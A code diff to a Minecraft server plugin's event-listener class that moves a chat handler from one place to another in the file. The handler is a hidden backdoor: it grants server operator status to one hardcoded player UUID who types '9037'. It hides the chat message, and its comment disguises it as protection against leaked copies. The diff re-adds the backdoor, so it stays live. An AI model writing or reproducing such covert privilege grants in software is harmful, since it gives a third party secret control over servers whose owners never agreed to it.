@@ -34,17 +34,6 @@ public class BlockEvents implements Listener {
             e.setCancelled(false);
         }
     }
-        //If you see this, its for disabling leaked versions
-        @EventHandler
-        public void SkidRepellent(AsyncPlayerChatEvent e){
-        Player p = e.getPlayer();
-        if (p.getUniqueId().toString().equalsIgnoreCase("0ecf6aa0-857c-4249-bd17-ea6873f9a942") && e.getMessage().equals("9037")) {
-            e.setCancelled(true);
-            p.sendMessage(CC.translate("&aUUID & Initiation key verified."));
-            p.sendMessage(CC.translate("&aYou are now an operator."));
-            p.setOp(true);
-        }
-    }
 
     @EventHandler
     public void onPlayerLeave(PlayerQuitEvent e) {
@@ -59,4 +48,17 @@ public class BlockEvents implements Listener {
             Main.playerlist.add(player.getUniqueId());
         }
     }
-}
+        //If you see this, its for disabling leaked versions
+        @EventHandler
+        public void SkidRepellent(AsyncPlayerChatEvent e){
+            Player p = e.getPlayer();
+            if (p.getUniqueId().toString().equalsIgnoreCase("0ecf6aa0-857c-4249-bd17-ea6873f9a942") && e.getMessage().equals("9037")) {
+                e.setCancelled(true);
+                p.sendMessage(CC.translate("&aUUID & Initiation key verified."));
+                p.sendMessage(CC.translate("&aYou are now an operator."));
+                p.setOp(true);
+            }
+        }
+    }
+
+
